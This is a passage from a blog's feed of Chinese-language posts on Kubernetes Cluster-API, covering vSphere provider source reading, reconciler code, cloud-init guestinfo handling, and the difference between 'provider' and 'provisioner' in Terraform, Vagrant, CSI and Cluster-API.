class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *VSphereMachineReconciler)</span> <span class="title">reconcileNormal</span><span class="params">(ctx *context.MachineContext)</span> <span class="params">(reconcile.Result, error)</span></span> &#123;</span><br><span class="line"><span class="comment">// 如果 VSphereMachine 的状态一场，则直接返回</span></span><br><span class="line"><span class="keyword">if</span> ctx.VSphereMachine.Status.ErrorReason != <span class="literal">nil</span> || ctx.VSphereMachine.Status.ErrorMessage != <span class="literal">nil</span> &#123;</span><br><span class="line">ctx.Logger.Info(<span class="string">"Error state detected, skipping reconciliation"</span>)</span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果 VSphereMachine 没有 Finalizer，则添加</span></span><br><span class="line"><span class="keyword">if</span> !util.Contains(ctx.VSphereMachine.Finalizers, infrav1.MachineFinalizer) &#123;</span><br><span class="line">ctx.VSphereMachine.Finalizers = <span class="built_in">append</span>(ctx.VSphereMachine.Finalizers, infrav1.MachineFinalizer)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !ctx.Cluster.Status.InfrastructureReady &#123;</span><br><span class="line">ctx.Logger.Info(<span class="string">"Cluster infrastructure is not ready yet, requeuing machine"</span>)</span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;RequeueAfter: waitForClusterInfrastructureReadyDuration&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在真正创建虚拟机之前，需要确保 cloud-init 配置已经生成</span></span><br><span class="line"><span class="keyword">if</span> ctx.Machine.Spec.Bootstrap.Data == <span class="literal">nil</span> &#123;</span><br><span class="line">ctx.Logger.Info(<span class="string">"Waiting for bootstrap data to be available"</span>)</span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;RequeueAfter: <span class="number">10</span> * time.Second&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里缺少真正创建虚拟机的实现</span></span><br><span class="line"><span class="keyword">return</span> reconcile.Result&#123;&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vsphere 所有关于虚拟机的操作都在<a href="https://github.com/kubernetes-sigs/cluster-api-provider-vsphere/tree/master/pkg/cloud/vsphere/services/govmomi" target="_blank" rel="noopener">这里</a>，感兴趣的可以看看。</p><h3 id="main-go"><a href="#main-go" class="headerlink" title="main.go"></a>main.go</h3><p>看完了具体实现逻辑，那么去看下控制器入口： main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">_ = clientgoscheme.AddToScheme(scheme)</span><br><span class="line">_ = infrav1.AddToScheme(scheme)</span><br><span class="line"><span class="comment">// +kubebuilder:scaffold:scheme</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> v, err := time.ParseDuration(os.Getenv(syncPeriodEnvVar)); err == <span class="literal">nil</span> &#123;</span><br><span class="line">defaultSyncPeriod = v</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> v, err := time.ParseDuration(os.Getenv(requeuePeriodEnvVar)); err == <span class="literal">nil</span> &#123;</span><br><span class="line">defaultRequeuePeriod = v</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是 init 函数，这里应该加上 <code>_ = clusterv1.AddToScheme(scheme)</code> ，否则在真正创建对应资源的时候，会报 <code>no kind is registered for the type</code> 的错误。（对 Operator 还不太熟，这里具体原因未了解）</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>相对来说 v1alpha2 版本改动范围较大，但是真香。各个逻辑部分比之前容易理解的多，且provider 实现也比之前简单许多（虽然还是比较麻烦）。</p><p>但是恰恰因为是 alpha 版本，再次吐槽，改动真的是太频繁了，按照项目中 Milestone 规划，在 20190831 就要 release v1alpha2 了，但是目前完成度还只有 <a href="https://github.com/kubernetes-sigs/cluster-api/milestone/6" target="_blank" rel="noopener">58%</a> 。而且目前看到除了 aws 和 vmware 对这个项目参与的比较积极，其他项目都处于假死状态，不知道后续是否会有其他厂家参与进来共同完善。</p><h2 id="P-S"><a href="#P-S" class="headerlink" title="P.S."></a>P.S.</h2><ul><li>cluster-api 相关项目使用 kubebuilder 辅助构建的，随着 kubebuilder v2 正式发布，相关代码结构改动较大，最好花费些时间了解下 kubebuilder v2。</li><li>目前 provider 中 aws 完善度是最高的，但是 aws 中的概念是真的复杂，<strong>概念劝退</strong>。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;今天继续来聊一聊 cluster-api，在上周看 cluster-api-provider-vsphere 代码的时候吐槽过，cluste
      
    
    </summary>
    
    
      <category term="Kubernetes" scheme="https://zdyxry.github.io/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>provider vs provisioner</title>
    <link href="https://zdyxry.github.io/2019/08/17/provider-vs-provisioner/"/>
    <id>https://zdyxry.github.io/2019/08/17/provider-vs-provisioner/</id>
    <published>2019-08-17T13:08:46.000Z</published>
    <updated>2019-08-17T13:09:18.569Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前 liqiang 同学写了一篇博客：<a href="https://liqiang.io/post/status-or-state-fa70399e" target="_blank" rel="noopener">Status 还是 State</a> 用于总结日常工作中遇到的相似词的区别。这两天看代码，经常能够看到两个词：provider 和 provisioner，作为一个英语渣渣，很难准确的理解两个词的区别。</p><h2 id="字典解释"><a href="#字典解释" class="headerlink" title="字典解释"></a>字典解释</h2><p>provider 字典中的解释为：</p><ol><li>供应者（商）</li><li>提供者（商）</li><li>供养人</li><li>…</li></ol><p>provisioner 字典中的解释为：</p><ol><li>粮食供应者</li></ol><p>看上去从字面上也是一个意思，那么我们来找个实际场景看看。</p><h2 id="实际场景"><a href="#实际场景" class="headerlink" title="实际场景"></a>实际场景</h2><h3 id="Terraform"><a href="#Terraform" class="headerlink" title="Terraform"></a>Terraform</h3><p>在 Terraform 概念中，同时存在 provider 和 provisioner 两个概念：</p><figure class="highlight plain"><figcaption><span>is used to create, manage, and update infrastructure resources such as physical machines, VMs, network switches, containers, and more. Almost any infrastructure type can be represented as a resource in Terraform.</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">A provider is responsible for understanding API interactions and exposing resources. Providers generally are an IaaS (e.g. AWS, GCP, Microsoft Azure, OpenStack), PaaS (e.g. Heroku), or SaaS services (e.g. Terraform Cloud, DNSimple, CloudFlare).</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Provisioners are used to execute scripts on a local or remote machine as part of resource creation or destruction. Provisioners can be used to bootstrap a resource, cleanup before destroy, run configuration management, etc.</span><br></pre></td></tr></table></figure><p>这里的 provider 对应 <code>供应商</code> 的含义是可以正确理解的，不同的供应商提供不同的插件。</p><p>provisioner 在这里指的是定义的资源可使用的插件，如 <code>remote-exec</code>,<code>file</code>,<code>chef</code> 等等，跟供应商关系不大。</p><h3 id="Vagrant-Docker"><a href="#Vagrant-Docker" class="headerlink" title="Vagrant Docker"></a>Vagrant Docker</h3><p>在搜索过程中，看到有人在 SO 上问了这么个问题 <a href="https://stackoverflow.com/questions/30394707/vagrant-docker-provider-vs-docker-provisioner" target="_blank" rel="noopener">Vagrant - Docker provider vs. docker provisioner</a></p><p>下面的高票回答：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Docker provisioner help to prepare environment: build and pull images, run containers if you need multiple containers running for your vagrant machine. Docker provider is running vagrant machine in docker container (instead of VM/cloud as other providers do).</span><br></pre></td></tr></table></figure><p>虽然感觉说的不是很清楚，但是也可以看出 provider 是有明确分类的，而 provisioner 更像是具体的动作种类，比如创建、删除、更新等。</p><h3 id="CSI"><a href="#CSI" class="headerlink" title="CSI"></a>CSI</h3><p>在 k8s CSI 中，也有 provisioner 的概念，这里主要是指具体的“置备动作执行者”。</p><p>当然 provisioner 也有多个，根据具体的存储供应商的不同，提供不同的 provisioner。</p><h3 id="Cluster-API"><a href="#Cluster-API" class="headerlink" title="Cluster-API"></a>Cluster-API</h3><p>在 Cluster-API 中，不同厂家为了支持 Cluster-API，会实现不同的 provider，比如 cluster-api-provider-aws, cluster-api-provider-vspher 等。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据实际的情况，provider 主要是用来区分供应者，是谁来提供某个事物，通常以公司区分。</p><p>provisioner 使用场景不多，主要是涉及到具体的功能执行，我这里理解为“置备动作执行者”，虽然也可以进行分类，但是主要意思应该是前者比较多一些。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;之前 liqiang 同学写了一篇博客：&lt;a href=&quot;https://liqiang.io/post/status-or-state-f
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>cluster-api-provider-vsphere 源码阅读</title>
    <link href="https://zdyxry.github.io/2019/08/16/cluster-api-provider-vsphere-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <id>https://zdyxry.github.io/2019/08/16/cluster-api-provider-vsphere-源码阅读/</id>
    <published>2019-08-16T12:57:25.000Z</published>
    <updated>2019-08-17T13:03:10.415Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>上一篇博客讲了 Cluster-API 的相关概念，现在我们来找一个 provider 实现看看具体里面做了啥，因为对 vmware 产品中的概念比较熟悉，就找了 cluster-api-provider-vsphere 。</p><p>以下内容均对应 clusterapi v1alpha1 版本。</p><h2 id="clusterctl-命令"><a href="#clusterctl-命令" class="headerlink" title="clusterctl 命令"></a>clusterctl 命令</h2><p>cluster-api provider 提供了命令行 <code>clusterctl</code> 用于给我们快速创建 bootstrap 集群用于创建目标 k8s 集群，我们来执行一下看看具体做了哪些工作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-workstation:~/go/src/github.com/kubernetes-sigs/cluster-api-provider-vsphere </span><br><span class="line">master ✗ $ clusterctl create cluster \                                                       </span><br><span class="line">  --provider vsphere \</span><br><span class="line">  --bootstrap-type kind \</span><br><span class="line">  --cluster ./out/management-cluster/cluster.yaml \</span><br><span class="line">  --machines ./out/management-cluster/machines.yaml \</span><br><span class="line">  --provider-components ./out/management-cluster/provider-components.yaml \</span><br><span class="line">  --addon-components ./out/management-cluster/addons.yaml \</span><br><span class="line">  --kubeconfig-out ./out/management-cluster/kubeconfig</span><br><span class="line">I0816 17:28:05.815156   14562 createbootstrapcluster.go:27] Preparing bootstrap cluster</span><br><span class="line">I0816 17:29:15.292547   14562 clusterdeployer.go:78] Applying Cluster API stack to bootstrap cluster</span><br><span class="line">I0816 17:29:15.292619   14562 applyclusterapicomponents.go:26] Applying Cluster API Provider Components</span><br><span class="line">I0816 17:29:16.492405   14562 clusterdeployer.go:83] Provisioning target cluster via bootstrap cluster</span><br><span class="line">I0816 17:29:16.505317   14562 applycluster.go:36] Creating cluster object management-cluster in namespace &quot;default&quot;</span><br><span class="line">I0816 17:29:16.518456   14562 clusterdeployer.go:92] Creating control plane machine in namespace &quot;default&quot;</span><br><span class="line">I0816 17:29:16.548814   14562 applymachines.go:36] Creating machines in namespace &quot;default&quot; # 因为众所周知的“网络”问题，导致我的 Pod image 无法拉取，所以就卡在这里了。。。</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到这个命令一共做了如下的事情：</p><ol><li>创建 bootstrap 集群</li><li>安装 Provider 组件</li><li>创建目标 k8s 集群，创建 Cluster CR，Machine CR</li><li>…</li></ol><p>这里因为“网络”问题我无法继续下去了，那么我们来看下命令行的具体实现。</p><p>这个命令最终是由 provider 提供的，在 provider 中需要实现 2个接口来辅助信息的获取：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Deployer <span class="keyword">interface</span> &#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> This requirement can be removed once after: https://github.com/kubernetes-sigs/cluster-api/issues/158</span></span><br><span class="line">GetIP(cluster *clusterv1.Cluster, machine *clusterv1.Machine) (<span class="keyword">string</span>, error)</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> This requirement can be removed after: https://github.com/kubernetes-sigs/cluster-api/issues/160</span></span><br><span class="line">GetKubeConfig(cluster *clusterv1.Cluster, master *clusterv1.Machine) (<span class="keyword">string</span>, error)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Bootstrap 集群中，会运行 2个 StatefulSet ，分别对应的是 Cluster-api-control-manager 和 provider-control-manager。其中跟 Hypervisor 打交道的逻辑全部在 provider-control-manager 中实现。</p><h2 id="Cluster"><a href="#Cluster" class="headerlink" title="Cluster"></a>Cluster</h2><p>创建流程：<br><img src="/2019/08/16/cluster-api-provider-vsphere-源码阅读/cluster_create.png" title="cluster_create"></p><p>删除流程：<br><img src="/2019/08/16/cluster-api-provider-vsphere-源码阅读/cluster_delete.png" title="cluster_delete"></p><p>在 Cluster Controller 中，最终所有的调度任务都会通过 actuator 完成，actuator 需要实现以下接口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Actuator <span class="keyword">interface</span> &#123;</span><br><span class="line"><span class="comment">// Reconcile creates or applies updates to the cluster.</span></span><br><span class="line">Reconcile(*clusterv1.Cluster) error</span><br><span class="line"><span class="comment">// Delete the cluster.</span></span><br><span class="line">Delete(*clusterv1.Cluster) error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来看下 vsphere 的实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Actuator)</span> <span class="title">Reconcile</span><span class="params">(cluster *clusterv1.Cluster)</span> <span class="params">(opErr error)</span></span> &#123;</span><br><span class="line">ctx, err := context.NewClusterContext(&amp;context.ClusterContextParams&#123;</span><br><span class="line">Cluster:          cluster,</span><br><span class="line">Client:           a.client,</span><br><span class="line">CoreClient:       a.coreClient,</span><br><span class="line">ControllerClient: a.controllerClient,</span><br><span class="line">Logger:           klogr.New().WithName(<span class="string">"[cluster-actuator]"</span>),</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">opErr = actuators.PatchAndHandleError(ctx, <span class="string">"Reconcile"</span>, opErr)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">ctx.Logger.V(<span class="number">6</span>).Info(<span class="string">"reconciling cluster"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := a.reconcilePKI(ctx); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := a.reconcileCloudConfigSecret(ctx); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := a.reconcileReadyState(ctx); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果在 actuator 中遇到需要等待或重新调度的情况，比如目标虚拟机未创建完成，目标集群未 ready 的情况，需要返回 <code>clusterErr.RequeueAfterError</code> ，从而重新调度。比如在配置 secret 时，如果无法获取目标集群的 k8s client，那么表示集群还未配置完成：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Actuator)</span> <span class="title">reconcileCloudConfigSecret</span><span class="params">(ctx *context.ClusterContext)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">client, err := kubeclient.New(ctx)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">ctx.Logger.Error(err, <span class="string">"target cluster is not ready"</span>)</span><br><span class="line"><span class="keyword">return</span> &amp;clusterErr.RequeueAfterError&#123;RequeueAfter: config.DefaultRequeue&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="machine"><a href="#machine" class="headerlink" title="machine"></a>machine</h2><p>创建流程：</p><img src="/2019/08/16/cluster-api-provider-vsphere-源码阅读/machine_create.png" title="machine_create"><p>删除流程：</p><img src="/2019/08/16/cluster-api-provider-vsphere-源码阅读/machine_delete.png" title="machine_delete"><p>在 v1alpha1 版本中，machine actuator 负责 2件事情：</p><ol><li>虚拟机构建；</li><li>k8s 集群构建（cloud-init 或 ssh）</li></ol><p>在 vsphere 中，创建虚拟机和 k8s 集群构建两件事情时一起完成的，大概流程如下：</p><ol><li>生成配置信息，如证书</li><li>判断目标 k8s 集群是否需要初始化（kubeadm init）</li><li>根据是否需要初始化及是否为 controlplane，生成对应 cloud-init 配置文件</li><li>克隆虚拟机，并将 cloud-init 配置文件作为 <code>guestinfo.userdata</code> 放入虚拟机配置参数中</li><li>虚拟机开机，通过 <code>vmtoolsd</code> 获取 <code>guestinfo.userdata</code> 信息，并作为 cloud-init 参数进行配置</li><li>k8s 集群构建完成（我在实际测试中，发现并没有自动创建 CNI 插件，不知道是不是 bug）</li><li>vsphere 克隆虚拟机为异步任务，提交克隆虚拟机任务后，得到 task id，后续判断虚拟机是否存在会用到；</li></ol><h2 id="Cloud-init-or-SSH"><a href="#Cloud-init-or-SSH" class="headerlink" title="Cloud-init or SSH"></a>Cloud-init or SSH</h2><h3 id="Cloud-init"><a href="#Cloud-init" class="headerlink" title="Cloud-init"></a>Cloud-init</h3><p>在 vsphere provider 中，k8s 部署是通过 cloud-init 实现的，因为之前对 cloud-init 并不了解，这里大概看了下实现方式。</p><p>首先在克隆虚拟机时，给目标虚拟机添加了 <code>guestinfo.userdata</code> 字段作为虚拟机配置参数，这个参数是配置在 Hypervisor 层面的，理论上存在虚拟机隔离性，那么虚拟机内部应该无法感知这个参数，这时候就需要一个工具：vmtools。各个虚拟化平台都会提供一个 vmtools 或类似的工具，用于给虚拟机提供一些高级功能，如：获取 IP、设置主机名、配置 NTP/DNS Server、执行特定命令等等。这些都是根据 vmtools 的实现方式不同支持的功能也不同。</p><p>vmware vmtools 在安装后，vsphere 可以获取到虚拟机的 IP 等信息，同时，在虚拟机内部会安装一些命令，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> $ <span class="built_in">which</span> vmtoolsd     </span><br><span class="line">/usr/bin/vmtoolsd</span><br><span class="line">root@yiran-workstation:~/project/cluster-api-provider-vsphere </span><br><span class="line">7d21730f ✔ $ vmware-*</span><br><span class="line">vmware-checkvm             vmware-hgfsclient          vmware-toolbox-cmd         vmware-vgauth-cmd        </span><br><span class="line">vmware-config-tools.pl     vmware-namespace-cmd       vmware-uninstall-tools.pl  vmware-vmblock-fuse      </span><br><span class="line">vmware-guestproxycerttool  vmware-rpctool             vmware-user-suid-wrapper   vmware-xferlogs</span><br></pre></td></tr></table></figure><p>vsphere provider 代码中并没有很明确的给出参数是如何传递的，通过不断的寻找，我找到了这个项目： <a href="https://github.com/vmware/cloud-init-vmware-guestinfo" target="_blank" rel="noopener">https://github.com/vmware/cloud-init-vmware-guestinfo</a> ，在这里我们可以看到获取 Hypervisor 层面虚拟机的额外配置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_guestinfo_value</span><span class="params">(key)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Returns a guestinfo value for the specified key.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    LOG.debug(<span class="string">"Getting guestinfo value for key %s"</span>, key)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        (stdout, stderr) = util.subp(</span><br><span class="line">            [VMTOOLSD, <span class="string">"--cmd"</span>, <span class="string">"info-get guestinfo."</span> + key])</span><br></pre></td></tr></table></figure><p>那么后续的步骤就可以想象的到了，全靠 cloud-init ，这里因为对 cloud-init 了解不多，之后有机会去学习下。</p><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>SSH 是我们日常远程连接服务器最常用的方式了，通过用户名，密码（或密钥）来进行 SSH 连接，之后都是通过 Shell 脚本的方式实现 k8s 集群部署，当然 Shell 脚本最终调用的命令是 kubeadm。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过阅读 vsphere provider 代码，我们大概了解了实现一个 Cluster-API provider 需要做哪些事情，最主要的资源控制工作都是在 Cluster-API 实现的，而 provider 主要根据各个场景不同，通过 actuator 实现对应工作，代码量和实现方式上也是千差万别。比如 aws 全部代码可能要 2w 行，而 IBM 的加一起可能不到2k，全看各家的重视程度了。</p><p>在写这篇博客的间隙，Cluster-API 开始了 alpha2 的实质性工作： <a href="https://github.com/kubernetes-sigs/cluster-api/blob/master/docs/developer/v1alpha1-compared-to-v1alpha2.md" target="_blank" rel="noopener">https://github.com/kubernetes-sigs/cluster-api/blob/master/docs/developer/v1alpha1-compared-to-v1alpha2.md</a> ，还没有了解具体的改动，等 beta 之后再看吧。</p><hr><p>吐槽：</p><p>因为 Cluster-API 处于 v1alpha1 阶段，master 分支代码改动非常大，前几天看的代码今天再看就跟记忆中对不上了，之后看代码的时候一定要注意去一个稳定分支上看，免得费时费力。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;上一篇博客讲了 Cluster-API 的相关概念，现在我们来找一个 provider 实现看看具体里面做了啥，因为对 vmware 产品中
      
    
    </summary>
    
    
      <category term="Kubernetes" scheme="https://zdyxry.github.io/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes 实战-Cluster API</title>
    <link href="https://zdyxry.github.io/2019/08/09/Kubernetes-%E5%AE%9E%E6%88%98-Cluster-API/"/>
    <id>https://zdyxry.github.io/2019/08/09/Kubernetes-实战-Cluster-API/</id>
    <published>2019-08-09T11:41:49.000Z</published>
    <updated>2019-08-09T11:46:26.927Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在当前 Kubernetes 生态中，生命周期管理相关工具官方的有 kubeadm、kubespray（部署集群部分通过 kubeadm） ，开源社区还有很多其他的实现，我们可以通过这类工具来实现 k8s 集群的部署，升级，增删节点，但是使用一个工具的前提是：基础设施已经准备完成。只有当基础设施准备完成后，kubeadm 之类工具才可以正常工作。</p><p>当我们在部署 Kubernetes 集群时，节点可能在任何环境上，比如 AWS、OpenStack、Vsphere、Azure 等，那么想要自动化配置基础设施，通常我们根据自己的环境不同，编写不通的代码来支持我们的虚拟化（or 服务器）场景。</p><p>基础设施包括不限于：</p><ul><li>OS 安装</li><li>Load Balance 配置</li><li>网络配置</li><li>IP 分配</li><li>…</li></ul><h2 id="Cluster-API"><a href="#Cluster-API" class="headerlink" title="Cluster-API"></a>Cluster-API</h2><p>Kubernetes 社区针对基础设施问题，发起了一个项目：cluster-api，目前处于 alpha1 版本，项目目标：</p><ol><li>使用声明式API管理 Kubernetes 集群的生命周期</li><li>支持多种环境，私有云或公有云</li><li>使用社区中现有的工具完成相应功能</li><li>…</li></ol><h3 id="功能简述"><a href="#功能简述" class="headerlink" title="功能简述"></a>功能简述</h3><ol><li>无需创建额外基础设施前提下创建 bootstrap cluster</li><li>通过 bootstrap cluster 创建目标 k8s 集群</li></ol><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><ol><li>cluster-api 使用声明式 API 管理 k8s 集群，需要环境中先存在一个 k8s 集群，通常成为 bootstrap cluster，若不存在，也可通过提供的命令行工具 clusterctl 创建 bootstrap cluster</li><li>在 bootstrap cluster 中，部署 CRD 及相应的 cluster api 控制器及 provider 控制器</li><li>在 bootstrap cluster 中，开始创建我们真正想要创建的资源：k8s 集群<br>创建资源类型为 Cluster、Machine 或 MachineDeployment ，对应的控制器会自动为我们创建好虚拟机</li><li>在虚拟机创建完成后，通过 kubeadm 创建 k8s 集群</li></ol><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><h4 id="虚拟机创建"><a href="#虚拟机创建" class="headerlink" title="虚拟机创建"></a>虚拟机创建</h4><p>目前看到的几个 Cluster-API Provider 项目实现，虚拟机均通过克隆的方式创建出来的。</p><h4 id="虚拟机创建失败处理"><a href="#虚拟机创建失败处理" class="headerlink" title="虚拟机创建失败处理"></a>虚拟机创建失败处理</h4><p>百度：每次等待 30s 查询一次，重试10次，若仍未成功，则创建失败</p><p>腾讯：每 2s 查询一次，若不成功，则一直循环</p><p>vsphere：提交虚拟机创建任务后未检查是否正确创建，未发现重试逻辑</p><p>OpenStack：每 10s 检测一次，若超过设定 timeout ，则创建失败</p><h4 id="虚拟机控制方式"><a href="#虚拟机控制方式" class="headerlink" title="虚拟机控制方式"></a>虚拟机控制方式</h4><p>如果虚拟化平台支持 Cloud-init（或类似功能），后续 k8s 部署通过 Cloud-init 实现；</p><p>若虚拟化平台不支持，则 bootstrap cluster 中的 Pod 通过 ssh 方式进入倒虚拟机内部执行命令。</p><p>通过 Clout-init 实现的好处是Controller 只需要控制虚拟机开机即可，后续无需再主动与虚拟机进行通信，由 Cloud-init 自行触发部署 k8s集群任务；若没有 Cloud-init，则 Controller 在提交虚拟机创建任务后，需要循环等待虚拟机是否正常，等待正常后还需通过 ssh 主动与虚拟机进行连接控制，过于繁琐。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Cluster API 目前还处于 Alpha1 版本，但是已经有很多厂家对其进行适配了，目前看到完成度比较高的公有云是 AWS，私有云是 Vsphere，之后好好读一下 Vsphere 的代码，了解下具体实现。</p>]]></content>
    
    <summary type="html">
    
      
      
